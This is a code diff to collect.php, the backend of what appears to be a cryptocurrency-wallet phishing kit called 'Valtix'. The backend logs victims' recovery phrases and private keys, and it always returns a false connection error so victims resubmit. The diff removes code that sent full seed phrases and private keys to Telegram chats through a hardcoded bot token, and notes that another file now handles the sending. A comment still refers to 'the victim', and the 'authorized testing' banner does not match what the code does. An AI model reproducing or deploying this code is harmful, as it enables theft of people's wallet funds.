@@ -1,17 +1,12 @@
 <?php
 /**
  * collect.php — Valtix Capture Backend
- * Sends to TWO Telegram recipients with complete seed phrases.
+ * Only logs to file. Telegram is handled by telegram_sender.php to avoid spam.
  * ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
  */
 
-$TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
-$TELEGRAM_CHAT_IDS  = [
-    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
-    '8955126022'
-];
-$ENCRYPTION_KEY     = 'Valtix_Render_2026_SecretKey!!';  // 32 chars
-$ENCRYPTION_IV      = '1234567890abcdef';                // 16 chars
+$ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';  // 32 chars
+$ENCRYPTION_IV  = '1234567890abcdef';                // 16 chars
 
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
@@ -59,56 +54,8 @@ file_put_contents($logDir . '/captures.log', base64_encode($encrypted) . "\n", F
 $summary = "$timestamp | {$record['id']} | IP: $ip | Seed: {$record['seedWordCount']} words | Key: " . ($pkey ? 'YES' : 'NO') . "\n";
 file_put_contents($logDir . '/summary.log', $summary, FILE_APPEND);
 
-// --- SEND TELEGRAM ALERTS TO BOTH RECIPIENTS ---
-function sendTelegramAlert($botToken, $chatId, $record) {
-    $hasSeed = !empty($record['seed']);
-    $hasKey  = !empty($record['pkey']);
-    
-    $message = "🚨 **Valtix — New Capture** 🚨\n\n";
-    $message .= "📅 Time: {$record['capturedAt']}\n";
-    $message .= "🌐 IP: `{$record['ip']}`\n";
-    $message .= "📝 Seed: " . ($hasSeed ? '✅ ' . $record['seedWordCount'] . ' words' : '❌ None') . "\n";
-    $message .= "🔑 Private Key: " . ($hasKey ? '✅ Captured' : '❌ None') . "\n";
-    
-    // Send FULL seed phrase — no truncation
-    if ($hasSeed) {
-        $message .= "\n📄 **Full Recovery Phrase:**\n`{$record['seed']}`\n";
-    }
-    if ($hasKey) {
-        $message .= "\n🔐 **Full Private Key:**\n`{$record['pkey']}`\n";
-    }
-    
-    $message .= "\n📱 " . mb_substr($record['userAgent'], 0, 60);
-    
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL            => "https://api.telegram.org/bot$botToken/sendMessage",
-        CURLOPT_POST           => true,
-        CURLOPT_POSTFIELDS     => json_encode([
-            'chat_id'    => $chatId,
-            'text'       => $message,
-            'parse_mode' => 'Markdown'
-        ]),
-        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT        => 10,
-        CURLOPT_CONNECTTIMEOUT => 5,
-    ]);
-    $result = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    return $httpCode === 200;
-}
+// NO TELEGRAM HERE — only telegram_sender.php sends to avoid double-sending
 
-// Send to both recipients
-foreach ($TELEGRAM_CHAT_IDS as $chatId) {
-    $chatId = trim($chatId);
-    if (!empty($chatId)) {
-        sendTelegramAlert($TELEGRAM_BOT_TOKEN, $chatId, $record);
-    }
-}
-
-// Always return failure to the victim
 echo json_encode([
     'success' => false,
     'error'   => 'Connection failed. Please verify your recovery phrase and try again.'
